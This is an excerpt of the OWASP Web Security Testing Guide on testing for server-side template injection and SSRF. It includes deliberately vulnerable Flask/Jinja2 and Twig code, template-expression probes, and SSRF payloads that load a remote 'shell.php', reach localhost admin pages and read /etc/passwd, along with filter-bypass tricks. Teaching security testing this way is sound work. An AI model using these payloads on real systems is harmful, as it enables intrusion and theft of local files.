# WSTG INPV (Input Validation) — Server-side Template Injection & SSRF

OWASP Web Security Testing Guide v4.2. Subset of the Input Validation category (SSTI and server-side request forgery). 2 test cases: WSTG-INPV-18, WSTG-INPV-19.

## Table of Contents

- [WSTG-INPV-18 — Testing for Server-side Template Injection](#wstg-inpv-18)
- [WSTG-INPV-19 — Testing for Server-Side Request Forgery](#wstg-inpv-19)

---

## WSTG-INPV-18

**Testing for Server-side Template Injection**

Summary
Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate
dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in
a template in an unsafe manner and results in remote code execution on the server. Any features that support
advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications,
CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect
against SSTI.

Example - Twig
The following example is an excerpt from the Extreme Vulnerable Web Application project.

public function getFilter($name)
{
[snip]
foreach ($this->filterCallbacks as $callback) {
if (false !== $filter = call_user_func($callback, $name)) {
return $filter;
}
}
return false;
}

In the getFilter function the call_user_func($callback, $name) is vulnerable to SSTI: the name parameter is fetched
from the HTTP GET request and executed by the server:

Figure 4.7.18-1: SSTI XVWA Example

Example - Flask/Jinja2
The following example uses Flask and Jinja2 templating engine. The page function accepts a 'name' parameter from
an HTTP GET request and renders an HTML response with the name variable content:

@app.route("/page")
def page():
name = request.values.get('name')
output = Jinja2.from_string('Hello ' + name + '!').render()
return output

This code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the name
parameter:

$ curl -g 'http://www.target.com/page?name={{7*7}}'
Hello 49!

Test Objectives
Detect template injection vulnerability points.
Identify the templating engine.
Build the exploit.

How to Test
SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct
HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)

Identify Template Injection Vulnerability
The first step in testing SSTI in plaintext context is to construct common template expressions used by various template
engines as payloads and monitor server responses to identify which template expression was executed by the server.

Common template expression examples:

a{{bar}}b
a{{7*7}}
{var} ${var} {{var}} <%var%> [% var %]

In this step an extensive template expression test strings/payloads list is recommended.
Testing for SSTI in code context is slightly different. First, the tester constructs the request that result either blank or error
server responses. In the example below the HTTP GET parameter is inserted info the variable personal_greeting in a
template statement:

personal_greeting=username
Hello user01

Using the following payload - the server response is blank "Hello":

personal_greeting=username<tag>
Hello

In the next step is to break out of the template statement and injecting HTML tag after it using the following payload

personal_greeting=username}}<tag>
Hello user01 <tag>

Identify the Templating Engine
Based on the information from the previous step now the tester has to identify which template engine is used by
supplying various template expressions. Based on the server responses the tester deduces the template engine used.
This manual approach is discussed in greater detail in this PortSwigger article. To automate the identification of the
SSTI vulnerability and the templating engine various tools are available including Tplmap or the Backslash Powered
Scanner Burp Suite extension.

Build the RCE Exploit
The main goal in this step is to identify to gain further control on the server with an RCE exploit by studying the template
documentation and research. Key areas of interest are:
For template authors sections covering basic syntax.
Security considerations sections.
Lists of built-in methods, functions, filters, and variables.
Lists of extensions/plugins.
The tester can also identify what other objects, methods and properties can be exposed by focusing on the self
object. If the self object is not available and the documentation does not reveal the technical details, a brute force of
the variable name is recommended. Once the object is identified the next step is to loop through the object to identify all
the methods, properties and attributes that are accessible through the template engine. This could lead to other kinds of
security findings including privilege escalations, information disclosure about application passwords, API keys,
configurations and environment variables, etc.

Tools

Tplmap
Backslash Powered Scanner Burp Suite extension
Template expression test strings/payloads list

References
James Kettle: Server-Side Template Injection:RCE for the modern webapp (whitepaper)
Server-Side Template Injection
Exploring SSTI in Flask/Jinja2
Server Side Template Injection: from detection to Remote shell
Extreme Vulnerable Web Application
Divine Selorm Tsa: Exploiting server side template injection with tplmap
Exploiting SSTI in Thymeleaf

---

## WSTG-INPV-19

**Testing for Server-Side Request Forgery**

Summary
Web applications often interact with internal or external resources. While you may expect that only the intended
resource will be handling the data you send, improperly handled data may create a situation where injection attacks
are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can
grant the attacker access to restricted actions, internal services, or internal files within the application or the
organization. In some cases, it can even lead to Remote Code Execution (RCE).

Test Objectives
Identify SSRF injection points.
Test if the injection points are exploitable.
Asses the severity of the vulnerability.

How to Test
When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be
malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust
relationship that often arises where the application server is able to interact with other back-end systems that are not
directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to
certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These
internal systems often contain sensitive data or functionality.
Consider the following request:

GET https://example.com/page?page=about.php

You can test this request with the following payloads.

Load the Contents of a File
GET https://example.com/page?page=https://malicioussite.com/shell.php

Access a Restricted Page
GET https://example.com/page?page=http://localhost/admin

Or:

GET https://example.com/page?page=http://127.0.0.1/admin

Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access
to the host, you also have privileges to directly access the admin page.

These kind of trust relationships, where requests originating from the local machine are handled differently than
ordinary requests, are often what enables SSRF to be a critical vulnerability.

Fetch a Local File
GET https://example.com/page?page=file:///etc/passwd

HTTP Methods Used
All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie
values as well.
One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the
application may not return anything immediately. Instead, the injected data may be used in other functionality such as
PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end
user or tester.
You can find more on Blind SSRF here](https://portswigger.net/web-security/ssrf/blind), or in the [references section.

PDF Generators
In some cases, a server may convert uploaded files to PDF format. Try injecting <iframe> , <img> , <base> , or
<script> elements, or CSS url() functions pointing to internal services.

<iframe src="file:///etc/passwd" width="400" height="400">
<iframe src="file:///c:/windows/win.ini" width="400" height="400">

Common Filter Bypass
Some applications block references to localhost and 127.0.0.1 . This can be circumvented by:
Using alternative IP representation that evaluate to 127.0.0.1 :
Decimal notation: 2130706433
Octal notation: 017700000001
IP shortening: 127.1
String obfuscation
Registering your own domain that resolves to 127.0.0.1
Sometimes the application allows input that matches a certain expression, like a domain. That can be circumvented if
the URL schema parser is not properly implemented, resulting in attacks similar to semantic attacks.
Using the @ character to separate between the userinfo and the host: https://expected-domain@attackerdomain

URL fragmentation with the # character: https://attacker-domain#expected-domain
URL encoding
Fuzzing
Combinations of all of the above
For additional payloads and bypass techniques, see the references section.

Remediation
SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and
URLs to be allowed. For more on SSRF prevention, read the Server Side Request Forgery Prevention Cheatsheet.

References
swisskyrepo: SSRF Payloads
Reading Internal Files Using SSRF Vulnerability
Abusing the AWS Metadata Service Using SSRF Vulnerabilities
OWASP Server Side Request Forgery Prevention Cheatsheet
Portswigger: SSRF
Portswigger: Blind SSRF
Bugcrowd Webinar: SSRF
Hackerone Blog: SSRF
Hacker101: SSRF
URI Generic Syntax

4.8 Testing for Error Handling
4.8.1 Testing for Improper Error Handling
4.8.2 Testing for Stack Traces

---
